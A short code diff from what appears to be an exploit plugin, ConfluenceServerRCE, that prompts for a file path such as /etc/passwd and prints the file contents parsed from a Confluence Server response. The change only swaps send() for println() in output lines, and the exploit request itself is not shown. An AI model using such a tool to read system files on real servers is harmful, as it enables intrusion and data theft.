@@ -49,7 +49,7 @@ public class ConfluenceServerRCE extends WebSocketPlugin {
     @Override
     public Object start() {
 
-        send("请输入要读取的文件 如/etc/passwd，输入exit退出");
+        println("请输入要读取的文件 如/etc/passwd，输入exit退出");
 
         while(true){
             String input = getInput();
@@ -65,9 +65,9 @@ public class ConfluenceServerRCE extends WebSocketPlugin {
                 Elements wiki = parse.getElementsByClass("wiki-content");
                 if (wiki!=null&&wiki.hasText()){
                     String text = wiki.html();
-                    send("=========================");
+                    println("=========================");
                     sendColorMsg(Message.RED(HtmlUtils.htmlEscape(text)));
-                    send("=========================");
+                    println("=========================");
                 }
             }
 
